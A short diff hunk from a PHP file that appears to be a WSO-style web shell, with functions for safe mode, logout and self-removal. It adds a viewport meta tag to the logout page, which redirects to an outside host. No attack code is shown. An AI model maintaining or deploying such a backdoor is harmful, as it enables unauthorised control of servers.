@@ -1094,7 +1094,7 @@ function actionSafeMode() {
 }
 function actionLogout() {
     setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
-	die("<meta http-equiv='refresh' content='1;URL=//labs.danicfonte.cf' />  <p>successfully exited.</p>");
+	die("<meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'><meta http-equiv='refresh' content='1;URL=//labs.danicfonte.cf' />  <p>successfully exited.</p>");
 }
 function actionSelfRemove() {
 	if($_POST['p1'] == 'yes')
